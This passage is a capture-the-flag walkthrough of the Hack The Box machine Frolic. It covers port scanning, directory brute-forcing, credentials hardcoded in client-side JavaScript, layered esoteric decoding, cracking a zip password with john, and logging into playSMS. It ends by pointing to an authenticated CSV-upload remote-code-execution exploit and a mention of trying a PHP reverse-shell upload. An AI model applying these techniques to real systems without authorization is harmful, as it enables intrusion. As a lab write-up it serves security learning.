I"VÕ<h1 id="enumeration">Enumeration</h1>
<h2 id="masscan--nmap">Masscan + Nmap</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
Discovered open port 1880/tcp on 10.10.10.111
Discovered open port 9999/tcp on 10.10.10.111
Discovered open port 139/tcp on 10.10.10.111
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Parse those ports to nmap:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
<span class="nv">$ </span>nmap <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
<span class="c"># Nmap 7.91 scan initiated Thu Jul 15 18:57:12 2021 as: nmap -sVC --min-rate 1000 -p 1880,9999,139 -oN nmap-fullscan.out 10.10.10.111</span>
Nmap scan report <span class="k">for </span>10.10.10.111
Host is up <span class="o">(</span>0.090s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE     VERSION
139/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
1880/tcp open  http        Node.js <span class="o">(</span>Express middleware<span class="o">)</span>
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.10.3 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: <span class="nt">-1h49m58s</span>, deviation: 3h10m31s, median: 1s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
| smb-os-discovery: 
|   OS: Windows 6.1 <span class="o">(</span>Samba 4.3.11-Ubuntu<span class="o">)</span>
|   Computer name: frolic
|   NetBIOS computer name: FROLIC<span class="se">\x</span>00
|   Domain name: <span class="se">\x</span>00
|   FQDN: frolic
|_  System <span class="nb">time</span>: 2021-07-15T18:57:31+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2021-07-15T13:27:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Thu Jul 15 18:57:33 2021 -- 1 IP address (1 host up) scanned in 20.94 seconds</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="port-9999-http">Port 9999 (HTTP)</h2>
<p>Visiting http://10.10.10.111:9999/ gives</p>
<blockquote>
  <p>Thank you for using nginx. http://forlic.htb:1880 
Adding frolic.htb to /etc/hosts.</p>
</blockquote>

<p>Directory brute-forcing:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> <span class="nt">-u</span> http://frolic.htb:9999/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-s</span> 200,204,301,302,307,308                        

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher                    ver: 2.2.1
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
     Target Url            ‚îÇ http://frolic.htb:9999/
     Threads               ‚îÇ 50
     Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
     Status Codes          ‚îÇ <span class="o">[</span>200, 204, 301, 302, 307, 308]
     Timeout <span class="o">(</span>secs<span class="o">)</span>        ‚îÇ 7
     User-Agent            ‚îÇ feroxbuster/2.2.1
     Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
     Recursion Depth       ‚îÇ 4
     New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
301        7l       13w      194c http://frolic.htb:9999/test
301        7l       13w      194c http://frolic.htb:9999/backup
301        7l       13w      194c http://frolic.htb:9999/dev
200       28l       71w      637c http://frolic.htb:9999/
301        7l       13w      194c http://frolic.htb:9999/admin
200        1l        1w        5c http://frolic.htb:9999/dev/test
301        7l       13w      194c http://frolic.htb:9999/loop
200     1006l     5029w        0c http://frolic.htb:9999/test/
301        7l       13w      194c http://frolic.htb:9999/dev/backup
301        7l       13w      194c http://frolic.htb:9999/admin/js
200        3l        3w        0c http://frolic.htb:9999/backup/
301        7l       13w      194c http://frolic.htb:9999/backup/loop
301        7l       13w      194c http://frolic.htb:9999/backup/.backup
301        7l       13w      194c http://frolic.htb:9999/admin/css
200       25l       63w      634c http://frolic.htb:9999/admin/
200        3l        1w        0c http://frolic.htb:9999/dev/backup/
301        7l       13w      194c http://frolic.htb:9999/loop/loop
301        7l       13w      194c http://frolic.htb:9999/backup/loop/loop
301        7l       13w      194c http://frolic.htb:9999/loop/loop/loop
<span class="o">[</span><span class="c">#################&gt;--] - 6m   1457768/1640262 49s     found:19      errors:1025</span>
<span class="o">[</span><span class="c">####################] - 2m     63087/63087   440/s   http://frolic.htb:9999/loop/loop</span>
<span class="o">[</span><span class="c">###################&gt;] - 2m     60670/63087   460/s   http://frolic.htb:9999/backup/loop/</span>
<span class="o">[</span><span class="c">##################&gt;-] - 2m     58610/63087   461/s   http://frolic.htb:9999/backup/.backup/</span>
<span class="o">[</span><span class="c">###############&gt;----] - 1m     49114/63087   465/s   http://frolic.htb:9999/backup/loop/loop</span>
<span class="o">[</span><span class="c">###############&gt;----] - 1m     48503/63087   465/s   http://frolic.htb:9999/admin/css/</span>
<span class="o">[</span><span class="c">#######&gt;------------] - 50s    25057/63087   500/s   http://frolic.htb:9999/loop/loop/</span>
<span class="o">[</span><span class="c">####&gt;---------------] - 26s    13537/63087   506/s   http://frolic.htb:9999/loop/loop/loop</span>
<span class="o">[</span><span class="c">#&gt;------------------] - 7s      3599/63087   485/s   http://frolic.htb:9999/backup/loop/loop/</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Also there‚Äôs a looping directory :0</p>

<table>
  <thead>
    <tr>
      <th>Directory</th>
      <th>Data</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>/backup/user.txt</td>
      <td>user - admin</td>
    </tr>
    <tr>
      <td>/backup/password.txt</td>
      <td>password - imnothuman</td>
    </tr>
    <tr>
      <td>/admin/</td>
      <td>Login form - ‚Äúc‚Äômon i m hackable‚Äù</td>
    </tr>
    <tr>
      <td>/dev/backup/</td>
      <td>/playsms</td>
    </tr>
    <tr>
      <td>/test/</td>
      <td>phpinfo data</td>
    </tr>
  </tbody>
</table>

<h2 id="admin">/admin</h2>
<p><code class="language-plaintext highlighter-rouge">admin:imnothuman</code> didn‚Äôt let us login. Also there‚Äôs a alert everytime we submit a wrong password that we‚Äôve only 1-2 attempts left.
Wondering how that‚Äôs working, I saw the source code:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"js/login.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Which contains:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">attempt</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="c1">// Variable to count number of attempts.</span>
<span class="c1">// Below function Executes on click of login button.</span>
<span class="kd">function</span> <span class="nx">validate</span><span class="p">(){</span>
<span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="nx">username</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">superduperlooperpassword_lol</span><span class="dl">"</span><span class="p">){</span>
<span class="nx">alert</span> <span class="p">(</span><span class="dl">"</span><span class="s2">Login successfully</span><span class="dl">"</span><span class="p">);</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">success.html</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Redirecting to other page.</span>
<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
<span class="nx">attempt</span> <span class="o">--</span><span class="p">;</span><span class="c1">// Decrementing by one.</span>
<span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">You have left </span><span class="dl">"</span><span class="o">+</span><span class="nx">attempt</span><span class="o">+</span><span class="dl">"</span><span class="s2"> attempt;</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// Disabling fields after 3 attempts.</span>
<span class="k">if</span><span class="p">(</span> <span class="nx">attempt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">return</span> <span class="kc">false</span><span class="p">;}}}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>So the username and password is <code class="language-plaintext highlighter-rouge">admin:superduperlooperpassword_lol</code> and there‚Äôs a attempt variable, which just reduces the value and sets document.getElementById(‚Äúusername‚Äù).disabled to true.</p>

<p>After logging in, it redirects to success.html having:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? <span class="o">!</span>.?.. ..... .....
....! ..... ..... .!.?. ..... .!?!! .?!!! <span class="o">!!!</span>?. ?!.?! <span class="o">!!!!!</span> <span class="o">!</span>...! .....
..... .!.!! <span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!!</span>.? ..... ..... ..... ..!?! <span class="o">!</span>.?!! <span class="o">!!!!!</span> <span class="o">!!!!!</span>
<span class="o">!!!!</span>? .?!.? <span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!!!!</span> .?... ..... ..... ....! ?!!.? ..... .....
..... .?.?! .?... ..... ..... ...!. <span class="o">!!!!!</span> <span class="o">!!</span>.?. ..... .!?!! .?... ...?.
?!.?. ..... ..!.? ..... ..!?! <span class="o">!</span>.?!! <span class="o">!!!!</span>? .?!.? <span class="o">!!!!!</span> <span class="o">!!!!</span><span class="nb">.</span> ?.... .....
..... ...!? <span class="o">!!</span>.?! <span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!!!!</span> ?.?!. ?!!!! <span class="o">!!!!!</span> <span class="o">!!</span>.?. ..... .....
..... .!?!! .?... ..... ..... ...?. ?!.?. ..... <span class="o">!</span>.... ..... ..!.! <span class="o">!!!!!</span>
<span class="o">!</span>.!!! <span class="o">!!</span>... ..... ..... ....! .?... ..... ..... ....! ?!!.? <span class="o">!!!!!</span> <span class="o">!!!!!</span>
<span class="o">!!!!!</span> <span class="o">!</span>?.?! .?!!! <span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!!!!</span> .?... ....! ?!!.? ..... .?.?!
.?... ..... ....! .?... ..... ..... ..!?! <span class="o">!</span>.?.. ..... ..... ..?.? <span class="o">!</span>.?..
<span class="o">!</span>.?.. ..... ..!?! <span class="o">!</span>.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! <span class="o">!!!</span>?.
?!.?! <span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!</span>... ..... ...!. ?.... ..... <span class="o">!</span>?!!. ?!!!! <span class="o">!!!!</span>? .?!.?
<span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!!</span>.? ..... ..!?! <span class="o">!</span>.?!! <span class="o">!!!!</span>? .?!.? <span class="o">!!!</span>.! <span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!!!!</span>
<span class="o">!</span>.... ..... ..... ..... <span class="o">!</span>.!.? ..... ..... .!?!! .?!!! <span class="o">!!!!!</span> <span class="o">!!</span>?.? <span class="o">!</span>.?!!
<span class="o">!</span>.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
..... .!.?. ..... ...!? <span class="o">!!</span>.?! <span class="o">!!!!!</span> <span class="o">!!</span>?.? <span class="o">!</span>.?!! <span class="o">!!!</span>.? ..... ..!?! <span class="o">!</span>.?!!
<span class="o">!!!!</span>? .?!.? <span class="o">!!!!!</span> <span class="o">!!</span>.?. ..... ...!? <span class="o">!!</span>.?. ..... ..?.? <span class="o">!</span>.?.. <span class="o">!</span>.!!! <span class="o">!!!!!</span>
<span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!</span>.?.. ..... ..!?! <span class="o">!</span>.?.. ..... .?.?! .?... .!.?. ..... .....
..... .!?!! .?!!! <span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!!</span>?. ?!.?! <span class="o">!!!!!</span> <span class="o">!!!!!</span> <span class="o">!!</span>.!! <span class="o">!!!!!</span> .....
..!.! <span class="o">!!!!!</span> <span class="o">!</span>.?.
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This seems like ook! language. I used a decoder <a href="https://www.dcode.fr/ook-language">here</a>
and it decoded to</p>
<blockquote>
  <p>‚ÄúNothing here check /asdiSIAJJ0QWE9JAS‚Äù</p>
</blockquote>

<p>Visiting /asdiSIAJJ0QWE9JAS/ gives:</p>
<blockquote>
  <p>UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB
BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs
K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve
EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj
lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC
AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG
AAAAAAEAAQBPAAAAAwEAAAAA</p>
</blockquote>

<p>This seems like base64 data, decoding base64</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> something
</pre></td></tr></tbody></table></code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>file something
something: Zip archive data, at least v2.0 to extract
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Decoded data is a zip archive, but it has a password. Let‚Äôs try cracking it‚Äôs hash john:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>zip2john something.zip <span class="o">&gt;</span> <span class="nb">hash
</span>ver 2.0 efh 5455 efh 7875 something.zip/index.php PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>176, <span class="nv">decmplen</span><span class="o">=</span>617, <span class="nv">crc</span><span class="o">=</span>145BFE23
<span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
password         <span class="o">(</span>something.zip/index.php<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2021-07-15 19:47<span class="o">)</span> 7.142g/s 29257p/s 29257c/s 29257C/s booboo..horse
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Zip inflated with the password: <code class="language-plaintext highlighter-rouge">password</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>unzip something.zip
Archive:  something.zip
<span class="o">[</span>something.zip] index.php password:
  inflating: index.php
</pre></td></tr></tbody></table></code></pre></div></div>
<p>It contains something like a hex data, let‚Äôs decode that:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>index.php
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
<span class="nv">$ </span><span class="nb">cat </span>index.php | xxd <span class="nt">-r</span> <span class="nt">-p</span>
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg<span class="o">==</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Seems like a base64 encoded data:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>index.php | xxd <span class="nt">-r</span> <span class="nt">-p</span> | <span class="nb">base64</span> <span class="nt">-di</span>
+++++ +++++ <span class="o">[</span>-&gt;++ +++++ +++&lt;<span class="o">]</span> <span class="o">&gt;</span>++++ +.--- <span class="nt">--</span>.++ +++++ .&lt;+++ <span class="o">[</span>-&gt;++ +&lt;<span class="o">]&gt;</span>+
++.&lt;+ ++[-&gt; <span class="nt">---</span>&lt;<span class="o">]</span> <span class="o">&gt;</span><span class="nt">----</span> <span class="nt">--</span>.-- <span class="nt">-----</span> .&lt;+++ +[-&gt;+ +++&lt;<span class="o">]</span> <span class="o">&gt;</span>+++. &lt;+++[ -&gt;---
&lt;<span class="o">]&gt;</span><span class="nt">--</span> .&lt;+++ <span class="o">[</span>-&gt;++ +&lt;<span class="o">]&gt;</span>+ .---. &lt;+++[ -&gt;--- &lt;<span class="o">]&gt;</span><span class="nt">--</span> <span class="nt">----</span><span class="nb">.</span> &lt;++++ <span class="o">[</span>-&gt;++ ++&lt;<span class="o">]&gt;</span>
++..&lt;
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This seems like a brainfuck code, I decoded it from <a href="https://www.dcode.fr/brainfuck-language">here</a>
After decoding I get <code class="language-plaintext highlighter-rouge">idkwhatispass</code>, But what is it for?</p>

<h2 id="playsms">/playsms</h2>
<p>Visiting /dev/backup/ showed me /playsms, accessing http://frolic.htb:9999/playsms/ gives me another login form.
Trying <code class="language-plaintext highlighter-rouge">admin:idkwhatispass</code> works for playsms login.</p>

<p>Home page says:</p>
<blockquote>
  <p><em>Go to main configuration or manage site to edit this page.</em></p>
  <h3 id="main-configuration">Main configuration</h3>
  <p>Settings -&gt; Main configuration -&gt; Information page</p>
</blockquote>

<p>We‚Äôve a page edit option which has insert/edit link option to upload images. I tried uploading a php reverse shell as image, which uploaded, but gave 304 to my webserver. Also the one giving those 304 was my IP.</p>
<h3 id="playsmslog">playsms.log</h3>
<p>This log mentions me, logging in, validating as admin. But then mentions something about possible CSRF attack.</p>
<pre><code class="language-log">10.10.14.23 frolic.htb:9999 2021-07-15 19:29:49 PID60f03f55befbb - L2 auth_validate_login # invalid login u:admin uid:1 ip:10.10.14.23
10.10.14.23 frolic.htb:9999 2021-07-15 19:55:26 PID60f0455686061 - L2 auth_validate_login # valid login u:admin uid:1 ip:10.10.14.23
10.10.14.23 frolic.htb:9999 2021-07-15 19:55:26 PID60f0455686061 - L2 login # u:admin uid:1 status:2 sid:10vohcpmigmj4n1rned9hba6t4 ip:10.10.14.23
10.10.14.23 frolic.htb:9999  PID60f047a77eb2e - L2 init # WARNING: possible CSRF attack. sid:10vohcpmigmj4n1rned9hba6t4 ip:10.10.14.23
10.10.14.23 frolic.htb:9999 2021-07-15 20:05:19 PID60f047a7a36ba admin L2 auth_block # WARNING: no access or blocked. sid:10vohcpmigmj4n1rned9hba6t4 ip:10.10.14.23 uid:1 app:main inc:core_auth op:block route:block
</code></pre>
<h3 id="send-from-file--import-in-phonebook">Send from file + Import in phonebook</h3>
<p>My Account -&gt; Send from file and My Account -&gt; Phonebook -&gt; Import</p>

<p>Mentions uploading of a .csv file.
Running searchsploit:
<img src="/assets/img/Posts/Frolic/frolic-searchsploit.png" alt="searchsploit" />
<code class="language-plaintext highlighter-rouge">PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution</code> clicks. We‚Äôre authenticated and have a csv file upload.
And the code mentions how it tries CSRF attack:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre> <span class="mi">90</span>     <span class="c1"># Grabbing CSRF token from body</span>
 <span class="mi">91</span>     <span class="o">/</span><span class="nb">name</span><span class="o">=</span><span class="s2">"X-CSRF-Token"</span> <span class="n">value</span><span class="o">=</span><span class="s2">"(?&lt;csrf&gt;[a-z0-9"</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s2">"&gt;/ =~ res.body
 92     fail_with(Failure::UnexpectedReply, "</span><span class="c1">#{peer} - Could not determine CSRF token") if csrf.nil?</span>
 <span class="mi">93</span>     <span class="n">vprint_good</span><span class="p">(</span><span class="s2">"X-CSRF-Token for login : </span><span class="si">#{</span><span class="n">csrf</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Also there‚Äôs a similar exploit below:<code class="language-plaintext highlighter-rouge">PlaySMS 1.4 - 'import.php' Remote Code Execution</code> which is also based on import.php
